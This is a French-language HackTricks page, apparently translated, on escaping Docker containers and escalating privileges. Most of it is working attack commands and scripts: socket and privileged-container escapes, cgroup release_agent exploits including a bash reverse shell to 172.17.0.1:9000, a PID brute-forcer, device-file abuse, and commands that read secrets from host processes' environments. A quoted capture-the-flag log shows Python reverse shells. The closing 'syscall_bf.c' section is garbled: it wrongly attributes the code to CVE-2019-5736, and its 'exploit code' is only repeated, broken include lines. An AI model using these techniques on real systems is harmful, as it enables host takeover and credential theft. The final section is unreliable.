# Évasion / Élévation de privilèges Docker

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.

</details>

<figure><img src="../../../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et **automatiser facilement des flux de travail** alimentés par les outils communautaires les plus avancés au monde.\
Accédez dès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Énumération et Évasion Automatiques

* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) : Il peut également **énumérer les conteneurs**
* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery) : Cet outil est assez **utile pour énumérer le conteneur dans lequel vous vous trouvez et même essayer de s'échapper automatiquement**
* [**amicontained**](https://github.com/genuinetools/amicontained) : Outil utile pour obtenir les privilèges que le conteneur possède afin de trouver des moyens de s'échapper
* [**deepce**](https://github.com/stealthcopter/deepce) : Outil pour énumérer et s'échapper des conteneurs
* [**grype**](https://github.com/anchore/grype) : Obtenez les CVE contenus dans le logiciel installé dans l'image

## Évasion du Socket Docker Monté

Si vous trouvez que le **socket docker est monté** à l'intérieur du conteneur Docker, vous pourrez vous échapper.\
Cela se produit généralement dans les conteneurs Docker qui, pour une raison quelconque, doivent se connecter au démon Docker pour effectuer des actions.
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
Dans ce cas, vous pouvez utiliser des commandes docker classiques pour communiquer avec le démon docker :
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```
{% hint style="info" %}
Au cas où le **socket docker est à un emplacement inattendu**, vous pouvez toujours communiquer avec lui en utilisant la commande **`docker`** avec le paramètre **`-H unix:///chemin/vers/docker.sock`**
{% endhint %}

Le démon Docker peut également [écouter sur un port (par défaut 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) ou sur les systèmes basés sur Systemd, la communication avec le démon Docker peut se faire via le socket Systemd `fd://`.

{% hint style="info" %}
De plus, faites attention aux sockets d'exécution des autres runtimes de haut niveau :

* dockershim : `unix:///var/run/dockershim.sock`
* containerd : `unix:///run/containerd/containerd.sock`
* cri-o : `unix:///var/run/crio/crio.sock`
* frakti : `unix:///var/run/frakti.sock`
* rktlet : `unix:///var/run/rktlet.sock`
* ...
{% endhint %}

## Évasion de l'abus des capacités

Vous devriez vérifier les capacités du conteneur, s'il possède l'une des suivantes, vous pourriez être en mesure de vous échapper : **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**

Vous pouvez vérifier les capacités actuelles du conteneur en utilisant les **outils automatiques mentionnés précédemment** ou :
```bash
capsh --print
```
Sur la page suivante, vous pouvez **en savoir plus sur les capacités de Linux** et comment les abuser pour échapper/escalader les privilèges :

{% content-ref url="../../linux-capabilities.md" %}
[linux-capabilities.md](../../linux-capabilities.md)
{% endcontent-ref %}

## Évasion des conteneurs privilégiés

Un conteneur privilégié peut être créé avec le drapeau `--privileged` ou en désactivant des défenses spécifiques :

* `--cap-add=ALL`
* `--security-opt apparmor=unconfined`
* `--security-opt seccomp=unconfined`
* `--security-opt label:disable`
* `--pid=host`
* `--userns=host`
* `--uts=host`
* `--cgroupns=host`
* `Mount /dev`

Le drapeau `--privileged` abaisse considérablement la sécurité du conteneur, offrant un **accès aux périphériques non restreint** et contournant **plusieurs protections**. Pour une analyse détaillée, consultez la documentation sur les impacts complets de `--privileged`.

{% content-ref url="../docker-privileged.md" %}
[docker-privileged.md](../docker-privileged.md)
{% endcontent-ref %}

### Privilégié + hostPID

Avec ces autorisations, vous pouvez simplement **passer à l'espace de noms d'un processus s'exécutant sur l'hôte en tant que root** comme init (pid:1) en exécutant simplement : `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`

Testez-le dans un conteneur en exécutant :
```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```
### Privilégié

Juste avec le drapeau privilégié, vous pouvez essayer d'**accéder au disque de l'hôte** ou essayer de **s'échapper en abusant de release\_agent ou d'autres échappatoires**.

Testez les contournements suivants dans un conteneur en exécutant :
```bash
docker run --rm -it --privileged ubuntu bash
```
#### Montage du disque - Poc1

Les conteneurs Docker bien configurés ne permettront pas des commandes telles que **fdisk -l**. Cependant, sur une commande Docker mal configurée où le drapeau `--privileged` ou `--device=/dev/sda1` avec des capacités est spécifié, il est possible d'obtenir les privilèges pour voir le lecteur hôte.

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

Donc, pour prendre le contrôle de la machine hôte, c'est trivial:
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
Et voilà ! Vous pouvez désormais accéder au système de fichiers de l'hôte car il est monté dans le dossier `/mnt/hola`.

#### Montage du disque - Poc2

Au sein du conteneur, un attaquant peut tenter d'obtenir un accès supplémentaire au système d'exploitation hôte sous-jacent via un volume hostPath inscriptible créé par le cluster. Voici quelques éléments courants que vous pouvez vérifier dans le conteneur pour voir si vous pouvez exploiter ce vecteur d'attaque :
```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```
#### Évasion des privilèges en abusant de l'agent de sortie existant ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1

{% code title="PoC initial" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```
{% endcode %}

#### Évasion des privilèges en abusant de l'agent de libération créé ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2

{% code title="Deuxième PoC" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# If mount gives an error, this won't work, you need to use the first PoC

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
{% endcode %}

Trouvez une **explication de la technique** dans :

{% content-ref url="docker-release_agent-cgroups-escape.md" %}
[docker-release\_agent-cgroups-escape.md](docker-release\_agent-cgroups-escape.md)
{% endcontent-ref %}

#### Évasion des privilèges en abusant de release\_agent sans connaître le chemin relatif - PoC3

Dans les exploits précédents, le **chemin absolu du conteneur à l'intérieur du système de fichiers de l'hôte est divulgué**. Cependant, ce n'est pas toujours le cas. Dans les cas où vous **ne connaissez pas le chemin absolu du conteneur à l'intérieur de l'hôte**, vous pouvez utiliser cette technique :

{% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
[release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
{% endcontent-ref %}
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
L'exécution du PoC dans un conteneur privilégié devrait fournir une sortie similaire à :
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
#### Évasion de privilèges en abusant des montages sensibles

Il existe plusieurs fichiers qui pourraient être montés et qui donnent des **informations sur l'hôte sous-jacent**. Certains d'entre eux peuvent même indiquer **quelque chose à exécuter par l'hôte lorsqu'un événement se produit** (ce qui permettrait à un attaquant de s'échapper du conteneur).\
L'abus de ces fichiers peut permettre :

* release\_agent (déjà abordé précédemment)
* [binfmt\_misc](sensitive-mounts.md#proc-sys-fs-binfmt\_misc)
* [core\_pattern](sensitive-mounts.md#proc-sys-kernel-core\_pattern)
* [uevent\_helper](sensitive-mounts.md#sys-kernel-uevent\_helper)
* [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)

Cependant, vous pouvez trouver **d'autres fichiers sensibles** à vérifier sur cette page :

{% content-ref url="sensitive-mounts.md" %}
[sensitive-mounts.md](sensitive-mounts.md)
{% endcontent-ref %}

### Montages arbitraires

À plusieurs reprises, vous constaterez que le **conteneur a un volume monté depuis l'hôte**. Si ce volume n'a pas été correctement configuré, vous pourriez être en mesure d'**accéder/modifier des données sensibles** : Lire des secrets, modifier les clés autorisées ssh...
```bash
docker run --rm -it -v /:/host ubuntu bash
```
### Élévation de privilèges avec 2 shells et montage hôte

Si vous avez un accès en tant que **root à l'intérieur d'un conteneur** qui a un dossier de l'hôte monté et que vous avez **échappé en tant qu'utilisateur non privilégié vers l'hôte** et avez un accès en lecture sur le dossier monté.\
Vous pouvez créer un **fichier bash suid** dans le **dossier monté** à l'intérieur du **conteneur** et **l'exécuter depuis l'hôte** pour une élévation de privilèges.
```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```
### Élévation de privilèges avec 2 shells

Si vous avez un accès en tant que **root à l'intérieur d'un conteneur** et que vous avez **échappé en tant qu'utilisateur non privilégié vers l'hôte**, vous pouvez abuser des deux shells pour **élever les privilèges à l'intérieur de l'hôte** si vous avez la capacité MKNOD à l'intérieur du conteneur (c'est par défaut) comme [**expliqué dans ce post**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
Avec une telle capacité, l'utilisateur root à l'intérieur du conteneur est autorisé à **créer des fichiers de périphériques blocs**. Les fichiers de périphériques sont des fichiers spéciaux utilisés pour **accéder au matériel sous-jacent et aux modules du noyau**. Par exemple, le fichier de périphérique bloc /dev/sda donne accès à **lire les données brutes sur le disque du système**.

Docker se protège contre l'abus des fichiers de périphériques blocs à l'intérieur des conteneurs en imposant une politique cgroup qui **bloque les opérations de lecture/écriture des fichiers de périphériques blocs**. Néanmoins, si un fichier de périphérique bloc est **créé à l'intérieur du conteneur**, il devient accessible depuis l'extérieur du conteneur via le répertoire **/proc/PID/root/**. Cet accès nécessite que le **propriétaire du processus soit le même** à la fois à l'intérieur et à l'extérieur du conteneur.

Exemple d'**exploitation** de ce [**writeup**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```
### hostPID

Si vous pouvez accéder aux processus de l'hôte, vous pourrez accéder à de nombreuses informations sensibles stockées dans ces processus. Exécutez le laboratoire de test :
```
docker run --rm -it --pid=host ubuntu bash
```
Par exemple, vous pourrez lister les processus en utilisant quelque chose comme `ps auxn` et rechercher des détails sensibles dans les commandes.

Ensuite, comme vous pouvez **accéder à chaque processus de l'hôte dans /proc/, vous pouvez simplement voler leurs secrets d'environnement** en exécutant :
```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```
Vous pouvez également **accéder aux descripteurs de fichiers d'autres processus et lire leurs fichiers ouverts** :
```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```
Vous pouvez également **arrêter des processus et provoquer un déni de service**.

{% hint style="warning" %}
Si vous avez d'une manière ou d'une autre un **accès privilégié sur un processus en dehors du conteneur**, vous pourriez exécuter quelque chose comme `nsenter --target <pid> --all` ou `nsenter --target <pid> --mount --net --pid --cgroup` pour **exécuter un shell avec les mêmes restrictions ns** (espérons-le aucune) **que ce processus.**
{% endhint %}

### hostNetwork
```
docker run --rm -it --network=host ubuntu bash
```
Si un conteneur est configuré avec le pilote de réseau hôte Docker (`--network=host`), la pile réseau de ce conteneur n'est pas isolée de l'hôte Docker (le conteneur partage l'espace de nom de réseau de l'hôte) et le conteneur ne reçoit pas d'adresse IP propre. En d'autres termes, le **conteneur lie tous les services directement à l'IP de l'hôte**. De plus, le conteneur peut **intercepter TOUT le trafic réseau que l'hôte** envoie et reçoit sur l'interface partagée `tcpdump -i eth0`.

Par exemple, vous pouvez utiliser cela pour **sniffer et même falsifier le trafic** entre l'hôte et l'instance de métadonnées.

Comme dans les exemples suivants :

* [Analyse : Comment contacter les SRE de Google : Obtenir un shell dans Cloud SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
* [L'interception du service de métadonnées permet une élévation de privilèges root (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)

Vous pourrez également accéder aux **services réseau liés à localhost** à l'intérieur de l'hôte ou même accéder aux **autorisations de métadonnées du nœud** (qui peuvent être différentes de celles auxquelles un conteneur peut accéder).

### hostIPC
```bash
docker run --rm -it --ipc=host ubuntu bash
```
Avec `hostIPC=true`, vous avez accès aux ressources de communication inter-processus (IPC) de l'hôte, telles que la **mémoire partagée** dans `/dev/shm`. Cela permet de lire/écrire là où les mêmes ressources IPC sont utilisées par d'autres processus de l'hôte ou du pod. Utilisez `ipcs` pour inspecter ces mécanismes IPC plus en détail.

* **Inspecter /dev/shm** - Recherchez des fichiers dans cet emplacement de mémoire partagée : `ls -la /dev/shm`
* **Inspecter les installations IPC existantes** - Vous pouvez vérifier si des installations IPC sont utilisées avec `/usr/bin/ipcs`. Vérifiez-le avec : `ipcs -a`

### Récupérer les capacités

Si l'appel système **`unshare`** n'est pas interdit, vous pouvez récupérer toutes les capacités en exécutant :
```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```
### Abus de l'espace utilisateur via des liens symboliques

La deuxième technique expliquée dans l'article [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) indique comment vous pouvez abuser des montages de liaison avec les espaces utilisateurs, pour affecter les fichiers à l'intérieur de l'hôte (dans ce cas spécifique, supprimer des fichiers).

<figure><img src="../../../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire facilement et **automatiser des flux de travail** alimentés par les outils communautaires les plus avancés au monde.\
Obtenez l'accès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## CVEs

### Exploitation de Runc (CVE-2019-5736)

Dans le cas où vous pouvez exécuter `docker exec` en tant que root (probablement avec sudo), vous pouvez essayer d'escalader les privilèges en vous échappant d'un conteneur en abusant de la CVE-2019-5736 (exploit [ici](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Cette technique va essentiellement **écraser** le binaire _**/bin/sh**_ de l'**hôte** **à partir d'un conteneur**, de sorte que toute personne exécutant docker exec peut déclencher la charge utile.

Modifiez la charge utile en conséquence et compilez le main.go avec `go build main.go`. Le binaire résultant doit être placé dans le conteneur Docker pour l'exécution.\
Lors de l'exécution, dès qu'il affiche `[+] Overwritten /bin/sh successfully`, vous devez exécuter ce qui suit depuis la machine hôte :

`docker exec -it <nom-du-conteneur> /bin/sh`

Cela déclenchera la charge utile qui est présente dans le fichier main.go.

Pour plus d'informations : [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

{% hint style="info" %}
Il existe d'autres CVE auxquelles le conteneur peut être vulnérable, vous pouvez trouver une liste dans [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)
{% endhint %}

## Évasion personnalisée de Docker

### Surface d'évasion de Docker

* **Espaces de noms :** Le processus doit être **complètement séparé des autres processus** via des espaces de noms, donc nous ne pouvons pas échapper à l'interaction avec d'autres processus en raison des espaces de noms (par défaut, ne peut pas communiquer via IPC, sockets Unix, services réseau, D-Bus, `/proc` d'autres processus).
* **Utilisateur root :** Par défaut, l'utilisateur exécutant le processus est l'utilisateur root (cependant, ses privilèges sont limités).
* **Capacités :** Docker laisse les capacités suivantes : `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
* **Appels système :** Ce sont les appels système que l'**utilisateur root ne pourra pas appeler** (en raison du manque de capacités + Seccomp). Les autres appels système pourraient être utilisés pour tenter de s'échapper.

{% tabs %}
{% tab title="Appels système x64" %}
```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```
{% endtab %}

{% onglet title="appels système arm64" %}
```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```
{% endtab %}

{% tab title="syscall_bf.c" %} 

## Docker Breakout Privilege Escalation

### Description

This exploit leverages a known vulnerability in Docker that allows an attacker to escape from a Docker container and gain root access on the host system.

### Usage

Compile the `syscall_bf.c` code and run the generated binary inside a Docker container to escalate privileges.

### Impact

Successful exploitation of this vulnerability can lead to a complete compromise of the host system.

### Recommendation

Regularly update Docker to the latest version and follow security best practices to mitigate the risk of privilege escalation attacks.

### Reference

- [Docker Breakout Privilege Escalation](https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout-privilege-escalation)

### Author

Unknown

### Publication Date

Unknown

### Cve Number

CVE-2019-5736

### Exploit Code

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sched.h>
#include <signal.h>
#include <string.h>
#include <errno.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#includejson.h>
#include <sys/prctl.h>
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <linux/sched.h>
#include <linux/capability.h>
#include <linux/ptrace.h>
#include <linux/bpf.h>
#include <linux/version.h>
#include <linux/limits.h>
#include <linux/ip.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/if_packet.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#includejson.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <linux/sched.h>
#include <linux/capability.h>
#include <linux/ptrace.h>
#include <linux/bpf.h>
#include <linux/version.h>
#include <linux/limits.h>
#include <linux/ip.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#includejson.h>
#include <linux/if_packet.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#includejson.h>
#include <linux/filter.h>
#include <linux/audit.h>
#includejson.h>
#include <linux/sched.h>
#include <linux/capability.h>
#include <linux/ptrace.h>
#include <linux/bpf.h>
#include <linux/version.h>
#include <linux/limits.h>
#include <linux/ip.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#includejson.h>
#include <linux/if_packet.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include#includejson.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <linux/sched.h>
#include <linux/capability.h>
#include <linux/ptrace.h>
#include <linux/bpf.h>
#include <linux/version.h>
#include <linux/limits.h>
#include <linux/ip.h>
#include#includejson.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/if_packet.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#includejson.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <linux/sched.h>
#include <linux/capability.h>
#include <linux/ptrace.h>
#include <linux/bpf.h>
#include <linux/version.h>
#include#includejson.h>
#include <linux/limits.h>
#include <linux/ip.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/if_packet.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#include <linux/if_ether.h>
#includejson.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <linux/sched.h>
#include <linux/capability.h>
#include <linux/ptrace.h>
#include <linux/bpf.h>
#include <linux/version.h>
#include <linux/limits.h>
#include#includejson.h>
#include <linux/ip.h>
